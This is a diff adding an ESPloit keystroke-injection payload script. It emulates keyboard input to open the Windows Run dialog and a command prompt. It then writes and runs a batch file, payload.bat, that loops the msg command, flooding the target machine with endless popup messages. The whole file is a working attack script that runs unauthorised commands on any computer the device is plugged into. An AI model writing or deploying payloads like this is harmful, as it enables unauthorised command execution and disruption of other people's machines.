@@ -1,0 +1,14 @@
+Rem: Creates a bat file that loops the msg command creating lots of popup messages.
+DefaultDelay:2000
+CustomDelay:5000
+Rem: 131 is "Windows Key or GUI" and 114 is "r"
+Rem: Brings up run menu
+Press:131+114
+PrintLine:cmd
+PrintLine:echo :start>>payload.bat
+PrintLine:echo msg * Hello from ESPloit!>>payload.bat
+PrintLine:echo goto start>>payload.bat
+PrintLine:payload.bat
+Rem: 131 is "Windows Key or GUI" and 100 is "d"
+Rem: Shows Desktop
+Press:131+100
